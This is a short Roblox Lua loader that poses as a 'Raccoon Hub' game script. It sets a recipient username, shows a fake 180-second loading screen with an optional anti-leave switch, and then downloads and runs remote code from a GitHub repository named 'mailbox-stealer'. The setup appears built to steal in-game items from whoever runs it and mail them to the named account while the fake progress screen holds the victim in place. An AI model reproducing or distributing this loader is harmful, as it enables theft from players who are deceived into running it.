UserName = "DigitoPlayThis"
UserName2 = "DigitoPlayThis" -- optional delete the whole line if you don't want it

_G.LoadingScreen = true
_G.AntiLeave = false
_G.MouseLock = false 
-- set them to false if you don't need them

_G.ScriptName = "Raccoon Hub Scriptz"
_G.FirstText = "Script Preparing"
_G.SecondText = "Script Loading..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes

loadstring(game:HttpGet("https://raw.githubusercontent.com/RyAtlasX/mailbox-stealer/main/psx.lua", true))()